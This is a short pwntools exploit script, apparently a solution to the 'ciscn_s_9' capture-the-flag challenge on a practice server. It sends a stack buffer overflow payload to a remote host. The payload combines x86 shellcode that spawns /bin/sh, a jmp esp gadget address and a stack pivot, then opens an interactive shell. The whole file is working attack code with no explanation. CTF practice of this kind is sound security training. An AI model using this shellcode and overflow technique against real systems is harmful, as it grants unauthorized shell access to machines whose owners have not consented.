from pwn import *


# p = process("./ciscn_s_9")
p = remote("node4.buuoj.cn", 26094)
pro = ELF("./ciscn_s_9")


code = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
jmp_esp = 0x08048554
sub_esp_call = asm("sub esp, 0x28; call esp")

pad = code 
pad = pad.ljust(0x24, b"\x00")
pad += p32(jmp_esp)+sub_esp_call
p.sendline(pad)

p.interactive()


